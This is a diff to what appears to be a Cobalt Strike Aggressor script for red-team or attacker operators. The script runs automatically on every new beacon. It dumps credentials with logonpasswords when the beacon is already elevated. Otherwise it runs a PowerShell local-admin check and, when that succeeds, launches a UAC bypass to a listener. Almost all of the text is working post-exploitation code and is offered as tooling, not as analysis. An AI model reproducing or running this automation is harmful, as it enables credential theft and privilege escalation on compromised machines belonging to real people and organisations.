@@ -15,31 +15,40 @@ alias checkla {
 beacon_command_register(
   "checkla", 
   "Checks if the current user is in a Local-Admin Context", 
-  "Synopsis: echo [no arguments]\n\nChecks using Powershell that supports (2.0 or later with 3.5 .NET) \n or (PS 4.0 or later) to perform a local admin check of current user.");
+  "Synopsis: checkla [no arguments]\n\nChecks using Powershell that supports (2.0 or later with 3.5 .NET) \n or (PS 4.0 or later) to perform a local admin check of current user.");
 
   # set up the Initial check
 on beacon_initial {
-  powershellimport($1);
-  bpowershell($1, 'Invoke-DACheck -Initial True');
-
-
-  $s = replace($2, 'received output:\n'.'');
-  # println($s);
-  $f = "[!] Found-DA-User:";
-  if ($f isin $s)
-    {
-    $pid = binfo($1, "pid");
-    elog("Found DA User at Pid: $pid");
-    show_message("Found DA User at Pid: $pid");
-    beacon_note($1, "DA User on this box");
-    }
-
-
   $a = binfo($1, "user");
   $b = "*";
   if ($b isin $a)
     {
     bgetsystem($1);
     blogonpasswords($1);
+    beacon_note($1, "Elevated Context: Ran LogonPasswords");
+    }
+  else
+    {
+    powershellimport($1);
+    bpowershell($1, 'Invoke-LocalAdminCheck -Initial True');
     }
 }
+
+on beacon_output {
+  $s = replace($2, 'received output:\n'.'');
+  # println($s);
+  $f = "[!] Agent-Started-in-LocalAdmin";
+  if ($f isin $s)
+    {
+    $pid = binfo($1, "pid");
+    elog("Initial Beacon is LocalAdmin at: $pid");
+    # beacon_note($1, "Elevated Context: Ran Logon");
+    $lis = listeners_local();
+    bbypassuac($1, $lis[0]);
+    }
+}
+
+# All intial beacons run script
+# event triggers on output
+# if it matches known string it executes logic
+# if intial matches a * in name it executes logic
